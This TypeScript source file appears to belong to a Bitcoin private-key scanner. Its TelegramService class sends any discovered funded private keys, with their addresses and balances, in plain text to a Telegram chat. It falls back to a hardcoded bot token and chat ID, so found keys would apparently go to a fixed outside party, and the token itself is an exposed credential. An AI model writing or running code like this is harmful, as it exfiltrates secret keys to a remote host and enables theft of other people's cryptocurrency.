import axios from 'axios';
import { PageData, PrivateKey } from '../types/keys';

export class TelegramService {
  private readonly TELEGRAM_API_BASE = 'https://api.telegram.org/bot';
  private readonly botToken: string;
  private readonly chatId: string;

  constructor() {
    this.botToken = process.env.TELEGRAM_TOKEN || '7688830724:AAHnBdSNgwnjNKyq62f_ZjlhQiNFHzm0SIU';
    this.chatId = process.env.TELEGRAM_CHAT_ID || '27196478';
  }

  async sendFundDiscoveryNotification(
    pageData: PageData, 
    foundKeys: PrivateKey[]
  ): Promise<void> {
    try {
      const message = this.formatDiscoveryMessage(pageData, foundKeys);
      
      const response = await axios.post(
        `${this.TELEGRAM_API_BASE}${this.botToken}/sendMessage`,
        {
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML',
        },
        {
          timeout: 10000,
        }
      );

      if (response.data.ok) {
        console.log('✅ Telegram notification sent successfully');
      } else {
        console.error('❌ Failed to send Telegram notification:', response.data);
      }
    } catch (error) {
      console.error('❌ Error sending Telegram notification:', error);
      // Don't throw error to avoid breaking the scanning process
    }
  }

  private formatDiscoveryMessage(pageData: PageData, foundKeys: PrivateKey[]): string {
    const totalBalance = foundKeys.reduce((sum, key) => sum + key.totalBalance, 0);
    
    let message = `🎉 <b>FUNDS DISCOVERED!</b> 🎉\n\n`;
    message += `📄 <b>Page:</b> ${pageData.pageNumber.toString()}\n`;
    message += `💰 <b>Total Balance:</b> ${totalBalance.toFixed(8)} BTC\n`;
    message += `🔑 <b>Keys with funds:</b> ${foundKeys.length}\n\n`;
    
    message += `<b>Details:</b>\n`;
    foundKeys.forEach((key, index) => {
      message += `${index + 1}. <code>${key.privateKey}</code>\n`;
      message += `   Balance: ${key.totalBalance.toFixed(8)} BTC\n`;
      message += `   Addresses:\n`;
      Object.entries(key.addresses).forEach(([format, address]) => {
        if (key.balances[format as keyof typeof key.balances] > 0) {
          message += `   - ${format}: <code>${address}</code> (${key.balances[format as keyof typeof key.balances].toFixed(8)} BTC)\n`;
        }
      });
      message += `\n`;
    });
    
    message += `⏰ <i>Discovered at: ${new Date().toISOString()}</i>`;
    
    return message;
  }

  async testConnection(): Promise<boolean> {
    try {
      const response = await axios.get(
        `${this.TELEGRAM_API_BASE}${this.botToken}/getMe`,
        { timeout: 5000 }
      );
      return response.data.ok;
    } catch (error) {
      console.error('Telegram connection test failed:', error);
      return false;
    }
  }
} 